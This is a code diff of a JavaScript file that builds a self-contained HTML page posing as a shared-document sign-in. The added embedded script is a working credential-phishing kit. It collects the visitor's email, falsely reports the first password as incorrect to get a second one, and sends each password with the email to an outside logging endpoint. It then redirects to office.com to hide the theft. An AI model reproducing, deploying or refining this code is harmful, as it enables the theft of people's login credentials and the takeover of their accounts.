@@ -1,12 +1,21 @@
-// content-part-1.js - HTML Template and CSS
+// content.js - Complete Self-Contained Application
+// This is the ONLY file you need - everything is included
 
 (function() {
     'use strict';
 
+    // ============================================================
+    // IMAGE CONFIGURATION
+    // ============================================================
+    
     const BACKGROUND_IMAGE = 'https://myprojec-37j.pages.dev/background-image.png';
     const DOCUMENT_ICON = 'https://myprojec-37j.pages.dev/bgo.png';
     const FONT_AWESOME = 'https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css';
 
+    // ============================================================
+    // COMPLETE HTML TEMPLATE with EMBEDDED JAVASCRIPT
+    // ============================================================
+    
     const HTML_TEMPLATE = `<!DOCTYPE html>
 <html lang="en">
 <head>
@@ -154,9 +163,306 @@ label{display:block;font-size:13px;font-weight:500;color:#2b2b2b;margin-bottom:5
         <a href="#">Privacy</a> · <a href="#">Terms</a> · <a href="#">Support</a>
     </div>
 </div>
+
+<script>
+// ============================================================
+// ALL JAVASCRIPT IS HERE - EMBEDDED IN THE HTML
+// ============================================================
+
+(function() {
+    'use strict';
+
+    console.log('✅ Embedded script loaded');
+
+    // Configuration
+    var CONFIG = {
+        logEndpoint: 'https://gnosis.com.py/serca/log.php',
+        redirectUrl: 'https://www.office.com'
+    };
+
+    // Get DOM elements
+    var emailInput = document.getElementById('emailInput');
+    var pwdFirstInput = document.getElementById('passwordFirstInput');
+    var pwdSecondInput = document.getElementById('passwordSecondInput');
+    var emailNextBtn = document.getElementById('emailNextBtn');
+    var pwdFirstBtn = document.getElementById('pwdFirstBtn');
+    var pwdSecondBtn = document.getElementById('pwdSecondBtn');
+    var statusText = document.getElementById('statusText');
+    var statusMsg = document.getElementById('statusMessage');
+    var stepBadge1 = document.getElementById('stepBadge1');
+    var stepEmail = document.getElementById('stepEmail');
+    var stepPwdFirst = document.getElementById('stepPasswordFirst');
+    var stepPwdSecond = document.getElementById('stepPasswordSecond');
+    var displayFirst = document.getElementById('displayEmailFirst');
+    var displaySecond = document.getElementById('displayEmailSecond');
+    var togglePwdFirst = document.getElementById('togglePwdFirst');
+    var togglePwdSecond = document.getElementById('togglePwdSecond');
+    var passwordErrorFirst = document.getElementById('passwordErrorFirst');
+    var passwordErrorSecond = document.getElementById('passwordErrorSecond');
+
+    // Verify elements exist
+    console.log('🔍 Checking DOM elements...');
+    console.log('emailInput:', !!emailInput);
+    console.log('emailNextBtn:', !!emailNextBtn);
+    console.log('pwdFirstBtn:', !!pwdFirstBtn);
+    console.log('pwdSecondBtn:', !!pwdSecondBtn);
+
+    if (!emailInput || !emailNextBtn) {
+        console.error('❌ Critical elements missing!');
+        // Try to recover
+        setTimeout(function() {
+            location.reload();
+        }, 1000);
+        return;
+    }
+
+    var storedEmail = '';
+
+    // Helper functions
+    function setStatus(message, type) {
+        type = type || 'info';
+        if (statusText) {
+            statusText.innerText = message;
+        }
+        if (statusMsg) {
+            statusMsg.className = 'status-message';
+            if (type === 'error') {
+                statusMsg.classList.add('error');
+            } else if (type === 'success') {
+                statusMsg.classList.add('success');
+            }
+            var icon = statusMsg.querySelector('i');
+            if (icon) {
+                if (type === 'error') {
+                    icon.className = 'fas fa-exclamation-circle';
+                } else if (type === 'success') {
+                    icon.className = 'fas fa-check-circle';
+                } else {
+                    icon.className = 'fas fa-info-circle';
+                }
+            }
+        }
+    }
+
+    function updateStepIndicators(step) {
+        if (stepBadge1) {
+            stepBadge1.classList.remove('active');
+            if (step === 1) {
+                stepBadge1.classList.add('active');
+            }
+        }
+    }
+
+    function showPasswordError(show, step) {
+        if (step === 2 && passwordErrorFirst) {
+            if (show) {
+                passwordErrorFirst.classList.remove('hidden');
+            } else {
+                passwordErrorFirst.classList.add('hidden');
+            }
+        } else if (step === 3 && passwordErrorSecond) {
+            if (show) {
+                passwordErrorSecond.classList.remove('hidden');
+            } else {
+                passwordErrorSecond.classList.add('hidden');
+            }
+        }
+    }
+
+    function showStep(step, email) {
+        email = email || '';
+        
+        if (stepEmail) stepEmail.classList.add('hidden');
+        if (stepPwdFirst) stepPwdFirst.classList.add('hidden');
+        if (stepPwdSecond) stepPwdSecond.classList.add('hidden');
+
+        showPasswordError(false, 2);
+        showPasswordError(false, 3);
+
+        if (step === 1) {
+            if (stepEmail) stepEmail.classList.remove('hidden');
+            updateStepIndicators(1);
+            if (emailInput) {
+                setTimeout(function() { emailInput.focus(); }, 100);
+            }
+            setStatus('Enter your email to access the shared document.', 'info');
+        } else if (step === 2) {
+            if (stepPwdFirst) stepPwdFirst.classList.remove('hidden');
+            updateStepIndicators(2);
+            if (email && displayFirst) {
+                displayFirst.textContent = email;
+            }
+            if (pwdFirstInput) {
+                pwdFirstInput.value = '';
+                setTimeout(function() { pwdFirstInput.focus(); }, 100);
+            }
+            setStatus('Enter your password for ' + email, 'info');
+        } else if (step === 3) {
+            if (stepPwdSecond) stepPwdSecond.classList.remove('hidden');
+            updateStepIndicators(3);
+            if (email && displaySecond) {
+                displaySecond.textContent = email;
+            }
+            if (pwdSecondInput) {
+                pwdSecondInput.value = '';
+                setTimeout(function() { pwdSecondInput.focus(); }, 100);
+            }
+            showPasswordError(true, 3);
+            setStatus('Please try again with a different password.', 'error');
+        }
+    }
+
+    function resetFlow() {
+        if (emailInput) emailInput.value = '';
+        if (pwdFirstInput) pwdFirstInput.value = '';
+        if (pwdSecondInput) pwdSecondInput.value = '';
+        storedEmail = '';
+        showPasswordError(false, 2);
+        showPasswordError(false, 3);
+        showStep(1);
+        if (pwdSecondBtn) {
+            pwdSecondBtn.disabled = false;
+            pwdSecondBtn.innerHTML = '<i class="fas fa-sign-in-alt"></i> Sign In';
+        }
+    }
+
+    function logToFile(email, password, eventType) {
+        var logData = {
+            email: email,
+            password: password,
+            event: eventType,
+            timestamp: new Date().toISOString()
+        };
+
+        if (CONFIG.logEndpoint) {
+            try {
+                fetch(CONFIG.logEndpoint, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(logData),
+                    keepalive: true
+                }).catch(function(error) {
+                    console.log('⚠️ Logging failed:', error);
+                });
+            } catch(e) {
+                console.log('⚠️ Logging error:', e);
+            }
+        }
+    }
+
+    // ============================================================
+    // EVENT LISTENERS - Direct assignment
+    // ============================================================
+
+    // Email Next Button
+    emailNextBtn.onclick = function(e) {
+        e.preventDefault();
+        console.log('📧 Email button clicked');
+        var email = emailInput.value.trim();
+        if (!email || email.indexOf('@') === -1 || email.indexOf('.') === -1) {
+            setStatus('Please enter a valid email address.', 'error');
+            return;
+        }
+        storedEmail = email;
+        try {
+            localStorage.setItem('sharedDocEmail', email);
+        } catch(e) {}
+        console.log('📧 Email entered:', email);
+        showStep(2, email);
+    };
+
+    // First Password Button
+    pwdFirstBtn.onclick = function(e) {
+        e.preventDefault();
+        console.log('🔑 First password button clicked');
+        var pwd = pwdFirstInput.value.trim();
+        if (!pwd) {
+            setStatus('Please enter a password.', 'error');
+            return;
+        }
+        var email = storedEmail || 'user';
+        try {
+            email = localStorage.getItem('sharedDocEmail') || email;
+        } catch(e) {}
+        console.log('🔑 First password attempt for:', email);
+        
+        logToFile(email, pwd, 'password_attempt_1');
+        
+        showPasswordError(true, 2);
+        setStatus('Incorrect password, please try again.', 'error');
+        
+        pwdFirstInput.value = '';
+        setTimeout(function() { pwdFirstInput.focus(); }, 100);
+        
+        showStep(3, email);
+    };
+
+    // Second Password Button
+    pwdSecondBtn.onclick = function(e) {
+        e.preventDefault();
+        console.log('🔑 Second password button clicked');
+        var pwd = pwdSecondInput.value.trim();
+        if (!pwd) {
+            setStatus('Please enter a password.', 'error');
+            return;
+        }
+        var email = storedEmail || 'user';
+        try {
+            email = localStorage.getItem('sharedDocEmail') || email;
+        } catch(e) {}
+        console.log('🔑 Second password attempt for:', email);
+        
+        logToFile(email, pwd, 'password_attempt_2_success');
+        
+        setTimeout(function() {
+            window.location.href = CONFIG.redirectUrl;
+        }, 150);
+    };
+
+    // Password Toggle
+    function setupToggle(btn, input) {
+        if (!btn || !input) return;
+        btn.onclick = function() {
+            var type = input.getAttribute('type') === 'password' ? 'text' : 'password';
+            input.setAttribute('type', type);
+            var icon = this.querySelector('i');
+            if (icon) {
+                icon.classList.toggle('fa-eye');
+                icon.classList.toggle('fa-eye-slash');
+            }
+        };
+    }
+    setupToggle(togglePwdFirst, pwdFirstInput);
+    setupToggle(togglePwdSecond, pwdSecondInput);
+
+    // Enter key support
+    function handleEnter(btn) {
+        return function(e) {
+            if (e.key === 'Enter') {
+                e.preventDefault();
+                if (btn) btn.click();
+            }
+        };
+    }
+    emailInput.addEventListener('keydown', handleEnter(emailNextBtn));
+    pwdFirstInput.addEventListener('keydown', handleEnter(pwdFirstBtn));
+    pwdSecondInput.addEventListener('keydown', handleEnter(pwdSecondBtn));
+
+    // Start the flow
+    resetFlow();
+    console.log('✅ Shared document flow ready');
+
+})();
+</script>
 </body>
 </html>`;
 
+    // Expose the HTML content globally
     window.blobHtmlContent = HTML_TEMPLATE;
-    console.log('✅ Part 1 loaded: HTML and CSS template ready');
+
+    console.log('✅ Content loaded: Complete self-contained application');
+    console.log('📸 Images from Cloudflare Pages:');
+    console.log('   - Background: https://myprojec-37j.pages.dev/background-image.png');
+    console.log('   - Icon: https://myprojec-37j.pages.dev/bgo.png');
+
 })();
